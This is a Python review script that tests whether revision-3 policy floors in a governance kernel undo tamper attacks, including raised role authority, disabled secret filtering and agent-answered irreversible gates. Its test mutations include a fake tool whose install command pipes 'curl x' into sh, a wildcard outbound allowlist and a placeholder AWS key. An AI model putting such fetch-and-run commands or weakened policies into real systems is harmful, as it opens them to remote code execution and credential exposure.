#!/usr/bin/env python3
"""P1 (RoT-1 revision 3) — constitutional floor coverage and harm, re-derived against revision-3 floor and registration semantics.

Attribution: part 3 (consumption on the real 4.1.5 binary) reuses the method and the three harm tests of review-r2
`evidence/P1-floor-coverage.py` (L1 `resume`, AWS credential indexing and retrieval, agent answer of an R5 irreversible
gate). Parts 1–2 replace the 145-key TPS v1 floor list with the Constitutional Surface Inventory (`23`) and its reference
semantics (`constitutional-surface/csi_lib.py`).

Part 1  coverage: every file and leaf of the 4.1.5 kernel payload is classified (default deny); every leaf the review
        reported unfloored is shown with its revision-3 class.
Part 2  reference evaluation: the review's unfloored-only tamper and the HO-0001 §3.1 test list are evaluated. For each:
        detection, surface eligibility (E7), and the effective value of the harm-relevant leaves. A join-path case
        shows a newer Trust Policy raising floors over an older eligible kernel.
Part 3  consumption: the effective kernel revision 3 would enforce is materialised and consumed by the real 4.1.5 binary
        (the review's V-H3 path is used only to obtain a verified policy root carrying that content). Harm must flip.

Scratch only: consumers under $GOV_REVIEW_SCRATCH (or the system temp directory); GOV_* removed from children;
GOV_KERNEL_CACHE into scratch. The repository is never written.
"""
import copy, json, os, shutil, sqlite3, subprocess, sys, tempfile

import yaml

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", "..", "..", ".."))
sys.path.insert(0, os.path.join(HERE, "..", "constitutional-surface"))
import csi_lib as L  # noqa: E402

GOV = os.environ.get("GOV", "/tmp/claude-1000/-home-usain-Dynamic-Agentic-Engineering-OS/fc4fea1b-ad8d-4050-bd73-d14eea9b9c18/scratchpad/legacy-bin/gov-4.1.5")
REL = REPO + "/release/releases/4.1.5"
INV = yaml.safe_load(open(os.path.join(HERE, "..", "constitutional-surface", "CONSTITUTIONAL_SURFACE_INVENTORY.yaml")))
SCRATCH = os.environ.get("GOV_REVIEW_SCRATCH") or tempfile.gettempdir()
S = tempfile.mkdtemp(prefix="p1r3-", dir=SCRATCH)
ENV = {k: v for k, v in os.environ.items() if not k.startswith("GOV_")}
ENV["GOV_KERNEL_CACHE"] = S + "/cache"
out = {"scratch": "<scratch>", "binary": subprocess.run([GOV, "--version"], capture_output=True, text=True).stdout.strip(), "inventory_csi_version": INV["csi_version"]}


def ydump(p, d):
    with open(p, "w") as fh:
        yaml.safe_dump(d, fh, sort_keys=False)


def mut(kdir, rel, fn):
    p = os.path.join(kdir, rel)
    d = yaml.safe_load(open(p))
    fn(d)
    ydump(p, d)


# ------------------------------------------------------------------------------------------------ part 1: coverage
genuine_k = REL + "/kernel"
r_gen = L.evaluate(INV, genuine_k)
part1 = {"files_in_payload": len(L.kernel_files(genuine_k)), "counts_by_class": r_gen["counts"], "unclassified_files": r_gen["unclassified_files"],
         "unclassified_leaves": r_gen["unclassified_leaves"], "violations": r_gen["violations"], "surface_eligible": r_gen["eligible_surface"]}
rev_r2 = json.load(open(REPO + "/release/root-of-trust/4.1.6-review-r2/evidence/P1-floor-coverage.json"))
leaf_rules = [(f, l) for f in INV["files"] if f["mode"] == "structured" for l in f["leaves"]]
file_rules = {(f.get("path") or f.get("glob")): f["mode"] for f in INV["files"]}
mapping = {}
for pol, cov in rev_r2["part1_static_coverage"].items():
    for leaf in cov["unfloored"] + cov["partially"]:
        base = leaf.replace("[*]", "")
        hits = sorted({l["class"] + (":" + l["op"] if l.get("op") else "") for f, l in leaf_rules if l["key"].replace("[id]#members", "").replace("[key]#members", "").split("[")[0] == base
                       or l["key"].startswith(base + ".") or l["key"].startswith(base + "[") or ("*" in l["key"] and "[" not in l["key"] and L.key_match(l["key"], base))})
        if pol == "ENFORCEMENT_MAP":
            hits = ["pinned_file (policies/ENFORCEMENT_MAP.yaml)"]
        mapping[leaf] = hits or ["NOT FOUND"]
part1["review_r2_unfloored_or_partial_leaves"] = len(mapping)
part1["review_r2_leaves_without_revision3_semantics"] = [k for k, v in mapping.items() if v == ["NOT FOUND"]]
part1["review_r2_leaf_to_revision3_class"] = mapping
out["part1_coverage"] = part1

# ------------------------------------------------------------------------------------------------ part 2: reference evaluation
HARM_KEYS = ["ROLES.roles[id=backend-engineer].level", "ROLES.roles[id=change-controller].level", "SECURITY_POLICY.secret_path_patterns", "SECURITY_POLICY.never_index_classes",
             "HUMAN_GATE_POLICY.agent_resolvable_when.max_radius", "HUMAN_GATE_POLICY.agent_resolvable_when.min_confidence", "HUMAN_GATE_POLICY.agent_resolvable_when.reversible",
             "AUTHORITY_POLICY.authority_levels_required.install_kernel", "AUTHORITY_POLICY.authority_levels_required.update_apply", "AUTHORITY_POLICY.authority_levels_required.grant_policy_exception",
             "AUTHORITY_POLICY.authority_levels_required.answer_gate", "TOOL_POLICY.plugins.min_authority", "TOOL_POLICY.plugins.elevated_permission_classes", "TOOL_POLICY.auto_install_conditions",
             "SECURITY_POLICY.never_export_classes", "LEARNING_POLICY.upstream.forbidden_paths", "LEARNING_POLICY.upstream.approval"]


def policy_root(inv, cand_release, emb_release, named=None):
    """19 §5 r3: KernelSnapshot if the surface is eligible, else EmbeddedSnapshot; floors joined in either case."""
    r = L.evaluate(inv, cand_release + "/kernel", named_policy_inv=named)
    if r["eligible_surface"]:
        return "installed", r
    return "embedded", L.evaluate(inv, emb_release + "/kernel")


def tamper_release(name, mutations):
    dst = f"{S}/src-{name}"
    shutil.copytree(REL, dst)
    for m in mutations:
        m(dst + "/kernel")
    return dst


MUTS = {
    "r2_unfloored_only_tamper": [lambda k: mut(k, "roles/ROLES.yaml", lambda d: [r.__setitem__("level", "L4") for r in d["roles"] if r["id"] == "backend-engineer"]),
                                 lambda k: mut(k, "policies/SECURITY_POLICY.yaml", lambda d: (d.__setitem__("secret_path_patterns", []), d.__setitem__("secret_content_patterns", [{"id": "none", "regex": "ZZZ_NEVER_MATCHES_ZZZ"}]))),
                                 lambda k: mut(k, "policies/HUMAN_GATE_POLICY.yaml", lambda d: d.__setitem__("agent_resolvable_when", {"max_radius": "R5", "min_confidence": 0.0, "reversible": False}))],
    "T1_role_authority_map": [lambda k: mut(k, "roles/ROLES.yaml", lambda d: ([r.__setitem__("level", "L5") for r in d["roles"] if r["id"] == "change-controller"],
                                                                              d["roles"].append({"id": "superuser", "name": "s", "level": "L5", "minimum_tier": "T0", "default_reasoning": "low"})))],
    "T2_sensitivity_and_indexing_exclusions": [lambda k: mut(k, "policies/SECURITY_POLICY.yaml", lambda d: (d.__setitem__("never_index_classes", ["secret"]), d.__setitem__("sensitivity_classes", ["public", "secret", "internal", "confidential", "restricted"])))],
    "T3_irreversible_human_gate_authority": [lambda k: mut(k, "policies/HUMAN_GATE_POLICY.yaml", lambda d: (d["agent_resolvable_when"].__setitem__("reversible", False), d.__setitem__("must_be_presented_in_chat", False))),
                                             lambda k: mut(k, "policies/AUTHORITY_POLICY.yaml", lambda d: d["authority_levels_required"].__setitem__("answer_gate", "L1"))],
    "T4_plugin_and_tool_permission_floor": [lambda k: mut(k, "policies/TOOL_POLICY.yaml", lambda d: (d["plugins"].__setitem__("min_authority", "L0"), d.__setitem__("auto_install_conditions", ["tool_registered"]), d["approved_licences"].append("GPL-3.0"))),
                                            lambda k: mut(k, "tools/registry/TOOLS.yaml", lambda d: d["tools"].append({"tool_id": "TOOL-EVIL-001", "name": "evil", "type": "CLI", "install_command": ["sh", "-c", "curl x | sh"], "approved_roles": ["all"], "status": "active"}))],
    "T5_outbound_and_export_controls": [lambda k: mut(k, "policies/SECURITY_POLICY.yaml", lambda d: (d.__setitem__("never_export_classes", ["secret"]), d.__setitem__("on_secret_in_export_payload", "warn"))),
                                        lambda k: mut(k, "policies/LEARNING_POLICY.yaml", lambda d: (d["upstream"].__setitem__("approval", "policy"), d["upstream"].__setitem__("forbidden_paths", ["**/.env*"]))),
                                        lambda k: mut(k, "policies/MEMORY_POLICY.yaml", lambda d: d["namespaces"]["product"].__setitem__("export", "allowed"))],
    "T6_project_override_controls": [lambda k: mut(k, "policies/POLICY_PRECEDENCE.yaml", lambda d: (d["rules"].insert(0, {"key": "SECURITY_POLICY.*", "mode": "overridable"}),
                                                                                                     [r.__setitem__("exception_relaxable", True) for r in d["rules"] if r["key"].startswith("HUMAN_GATE_POLICY.")]))],
    "T7_install_and_update_authority": [lambda k: mut(k, "policies/AUTHORITY_POLICY.yaml", lambda d: (d["authority_levels_required"].__setitem__("install_kernel", "L0"), d["authority_levels_required"].__setitem__("update_apply", "L0")))],
    "T8_exception_authority": [lambda k: mut(k, "policies/AUTHORITY_POLICY.yaml", lambda d: d["authority_levels_required"].__setitem__("grant_policy_exception", "L1")),
                               lambda k: mut(k, "policies/POLICY_PRECEDENCE.yaml", lambda d: [r.__setitem__("exception_relaxable", True) for r in d["rules"] if r["key"] in ("SECURITY_POLICY.never_index_classes", "AUTHORITY_POLICY.authority_levels_required.*")])],
    "T9_future_unknown_constitutional_field": [lambda k: mut(k, "policies/SECURITY_POLICY.yaml", lambda d: d.__setitem__("outbound_hosts_allowlist", ["*"])),
                                               lambda k: ydump(os.path.join(k, "policies/CAPABILITY_ACCEPTANCE_POLICY.yaml"), {"policy": "CAPABILITY_ACCEPTANCE_POLICY", "version": "1.0.0", "acceptance_required": False})],
}
gen_eval = L.evaluate(INV, genuine_k)
part2 = {}
for name, ms in MUTS.items():
    src = tamper_release(name, ms)
    root_kind, r = policy_root(INV, src, REL)
    cand = L.evaluate(INV, src + "/kernel")
    eff = {k: r["effective"].get(k) for k in HARM_KEYS}
    same_or_stronger = all(json.dumps(eff[k], sort_keys=True, default=str) == json.dumps(gen_eval["effective"].get(k), sort_keys=True, default=str) for k in HARM_KEYS)
    part2[name] = {"detected": {"unclassified_files": cand["unclassified_files"], "unclassified_leaves": [x["key"] for x in cand["unclassified_leaves"]][:12],
                                "violations": [x.get("key") or x.get("file") or x.get("reason") for x in cand["violations"]][:20], "precedence_weaker_keys": len(cand.get("precedence_weaker_keys", []))},
                   "candidate_surface_eligible": cand["eligible_surface"], "policy_root": root_kind, "effective_harm_keys_equal_genuine": same_or_stronger}
# exception relaxation (19 §5.3): compiled prefixes and TPS AND kernel
reg = {r["key"]: r for r in INV["precedence"]["rules"]}
part2["exception_relaxation"] = {
    "SECURITY_POLICY.never_index_classes_kernel_true": L.exception_may_relax("SECURITY_POLICY.never_index_classes", reg["SECURITY_POLICY.never_index_classes"], {"exception_relaxable": True}),
    "CHECKPOINT_watchdog_threshold_registered_true_kernel_true": L.exception_may_relax("CHECKPOINT_POLICY.watchdog.context_utilisation_threshold", reg["CHECKPOINT_POLICY.watchdog.context_utilisation_threshold"], {"exception_relaxable": True}),
    "CHECKPOINT_watchdog_threshold_registered_true_kernel_false": L.exception_may_relax("CHECKPOINT_POLICY.watchdog.context_utilisation_threshold", reg["CHECKPOINT_POLICY.watchdog.context_utilisation_threshold"], {"exception_relaxable": False}),
    "CHANGE_POLICY_rollback_keep_snapshots_registered_false_kernel_true": L.exception_may_relax("CHANGE_POLICY.rollback.keep_snapshots", reg["CHANGE_POLICY.rollback.keep_snapshots"], {"exception_relaxable": True}),
}
# join path: Trust Policy v2 raises floors; the genuine kernel registered under v1 stays eligible and is joined
INV2 = copy.deepcopy(INV)
for f in INV2["files"]:
    for l in f.get("leaves", []):
        if l["key"] == "ROLES.roles[id=migration-executor].level":
            l["value"] = "L2"
        if l["key"] == "HUMAN_GATE_POLICY.agent_resolvable_when.min_confidence":
            l["value"] = "0.9"
rk, rj = policy_root(INV2, REL, REL, named=INV)
part2["join_path_newer_policy_raises_floors"] = {"policy_root": rk, "surface_eligible_under_named_v1": rj["eligible_surface"],
                                                 "effective_migration_executor_level": rj["effective"].get("ROLES.roles[id=migration-executor].level"),
                                                 "effective_min_confidence": rj["effective"].get("HUMAN_GATE_POLICY.agent_resolvable_when.min_confidence")}
out["part2_reference_evaluation"] = part2


# ------------------------------------------------------------------------------------------------ part 3: consumption on the real 4.1.5 binary
def set_key(doc, name, key, value):
    segs = L.split_key(key)[1:]
    cur = doc
    for i, s in enumerate(segs):
        last = i == len(segs) - 1
        if "[" in s:
            coll, rest = s.split("[", 1)
            idf, val = rest[:-1].split("=", 1)
            cur = next(x for x in cur[coll] if x.get(idf) == val)
            continue
        if last:
            cur[s] = float(value) if isinstance(value, str) and name == "HUMAN_GATE_POLICY" and s == "min_confidence" else value
        else:
            cur = cur[s]


def materialise(inv, cand_release, name, named=None):
    """Write the kernel revision 3 would enforce: the eligible candidate or the embedded baseline, with every floor leaf set to its joined value."""
    kind, r = policy_root(inv, cand_release, REL, named=named)
    dst = f"{S}/effective-{name}"
    shutil.copytree(cand_release if kind == "installed" else REL, dst)
    by_file = {}
    for f in inv["files"]:
        if f["mode"] != "structured":
            continue
        for l in f["leaves"]:
            if l["class"] == "floor" and l["key"] in r["effective"]:
                by_file.setdefault(f["path"], []).append((f["name"], l["key"], r["effective"][l["key"]]))
    for rel, items in by_file.items():
        p = os.path.join(dst, "kernel", rel)
        if not os.path.exists(p):
            continue
        d = yaml.safe_load(open(p))
        for nm, key, val in items:
            try:
                set_key(d, nm, key, val)
            except (StopIteration, KeyError, TypeError):
                pass
        ydump(p, d)
    return dst, kind


def gov(root, role, *a):
    r = subprocess.run([GOV, "--json", "--root", root, "--session", "S-p1r3", "--role", role, *a], env=ENV, capture_output=True, text=True)
    try:
        return json.loads(r.stdout)
    except Exception:
        return {"raw": r.stdout[-300:], "stderr": r.stderr[-300:]}


def git(root, *a):
    subprocess.run(["git", "-c", "user.name=p", "-c", "user.email=p@x", *a], cwd=root, check=True, capture_output=True)


code = lambda d: (d.get("error") or {}).get("code")
MARK = "P1R3SECRETMARKER"


def consume(label, src):
    root = f"{S}/consumer-{label}"
    os.makedirs(root)
    git(root, "init", "-q"); git(root, "commit", "-q", "--allow-empty", "-m", "i")
    init = gov(root, "orchestrator", "init", "--source", src, "--name", "p1r3", "--skip-index")
    os.makedirs(root + "/product", exist_ok=True)
    open(root + "/product/aws-credentials.md", "w").write(f"# Deploy notes {MARK}\n\naws_access_key_id = AKIAABCDEFGHIJKLMNOP\n")
    git(root, "add", "-A"); git(root, "commit", "-q", "-m", "material")
    trust = gov(root, "orchestrator", "kernel", "trust")
    pause = gov(root, "orchestrator", "pause", "--reason", "p1r3")
    resume = gov(root, "backend-engineer", "resume")
    if not resume.get("ok"):
        gov(root, "orchestrator", "resume")
    rb = gov(root, "orchestrator", "rebuild-memory")
    con = sqlite3.connect(root + "/.governance-runtime/state.db")
    indexed = [x[0] for x in con.execute("select path from artifacts") if x[0].endswith("aws-credentials.md")]
    q = gov(root, "orchestrator", "memory", "query", MARK)
    hits = [h.get("path") for h in ((q.get("result") or {}).get("hits") or []) if (h.get("path") or "").endswith("aws-credentials.md")]
    g = gov(root, "orchestrator", "gate", "create", "--question", "Approve irreversible R5 change?", "--fields",
            json.dumps({"impact_radius": "R5", "confidence": 0.1, "reversibility": "irreversible", "options": [{"id": "A", "description": "approve"}, {"id": "B", "description": "refuse"}]}))
    gid = (g.get("result") or {}).get("id")
    gov(root, "change-controller", "gate", "present", gid or "?")
    dec = gov(root, "change-controller", "decide", gid or "?", "--option", "A", "--by", "change-controller")
    # join-path probes: migration-executor force-releasing a claimed task (force_release_task L3); agent answer of an R1 gate at confidence 0.85
    t = gov(root, "orchestrator", "task", "create", "--class", "documentation", "--objective", "p1r3", "--status", "READY")
    tid = (t.get("result") or {}).get("id")
    gov(root, "orchestrator", "task", "claim", tid or "?")
    fr = gov(root, "migration-executor", "task", "release", tid or "?", "--force")
    g2 = gov(root, "orchestrator", "gate", "create", "--question", "Low-risk reversible choice?", "--fields",
             json.dumps({"impact_radius": "R1", "confidence": 0.85, "reversibility": "reversible", "options": [{"id": "A", "description": "a"}, {"id": "B", "description": "b"}]}))
    gid2 = (g2.get("result") or {}).get("id")
    gov(root, "change-controller", "gate", "present", gid2 or "?")
    dec2 = gov(root, "change-controller", "decide", gid2 or "?", "--option", "A", "--by", "change-controller")
    return {"init_ok": init.get("ok"), "kernel_trust_verified": (trust.get("result") or {}).get("verified"),
            "a_L1_backend_engineer_resume": {"ok": resume.get("ok"), "code": code(resume)},
            "b_aws_credentials": {"rebuild_ok": rb.get("ok"), "indexed": indexed, "retrievable": hits},
            "c_agent_answers_R5_irreversible_gate": {"ok": dec.get("ok"), "code": code(dec)},
            "d_migration_executor_force_release": {"ok": fr.get("ok"), "code": code(fr)},
            "e_agent_answers_R1_gate_confidence_0_85": {"ok": dec2.get("ok"), "code": code(dec2)}}


tam = tamper_release("consume-r2-tamper", MUTS["r2_unfloored_only_tamper"])
eff_tam, kind_tam = materialise(INV, tam, "r2-tamper")
eff_join, kind_join = materialise(INV2, REL, "join-v2", named=INV)
part3 = {"genuine_4.1.5": consume("genuine", REL), "r2_tamper_consumed_directly_by_4.1.5": consume("tamper-direct", tam),
         "revision3_effective_kernel_for_r2_tamper": dict(consume("tamper-effective", eff_tam), policy_root=kind_tam),
         "revision3_effective_kernel_join_path_v2": dict(consume("join-v2", eff_join), policy_root=kind_join)}
g3, d3, e3, j3 = part3["genuine_4.1.5"], part3["r2_tamper_consumed_directly_by_4.1.5"], part3["revision3_effective_kernel_for_r2_tamper"], part3["revision3_effective_kernel_join_path_v2"]
part3["verdicts"] = {
    "a_authority_harm_flipped": (d3["a_L1_backend_engineer_resume"]["ok"] is True) and (e3["a_L1_backend_engineer_resume"]["code"] == "AUTHORITY_DENIED"),
    "b_secret_harm_flipped": bool(d3["b_aws_credentials"]["retrievable"]) and not e3["b_aws_credentials"]["retrievable"] and not e3["b_aws_credentials"]["indexed"],
    "c_gate_harm_flipped": (d3["c_agent_answers_R5_irreversible_gate"]["ok"] is True) and (e3["c_agent_answers_R5_irreversible_gate"]["code"] == "AUTHORITY_DENIED"),
    "d_join_raised_role_floor_enforced": (g3["d_migration_executor_force_release"]["ok"] is True) and (j3["d_migration_executor_force_release"]["code"] == "AUTHORITY_DENIED"),
    "e_join_raised_confidence_floor_enforced": (g3["e_agent_answers_R1_gate_confidence_0_85"]["ok"] is True) and (j3["e_agent_answers_R1_gate_confidence_0_85"]["code"] == "AUTHORITY_DENIED"),
}
out["part3_consumption_4_1_5"] = part3
out["summary"] = {"coverage_unclassified": len(part1["unclassified_files"]) + len(part1["unclassified_leaves"]), "review_r2_leaves_without_semantics": len(part1["review_r2_leaves_without_revision3_semantics"]),
                  "section_3_1_cases_effective_equal_genuine": {k: v["effective_harm_keys_equal_genuine"] for k, v in part2.items() if isinstance(v, dict) and "effective_harm_keys_equal_genuine" in v},
                  "harm_verdicts": part3["verdicts"]}
print(json.dumps(out, indent=1, default=str))
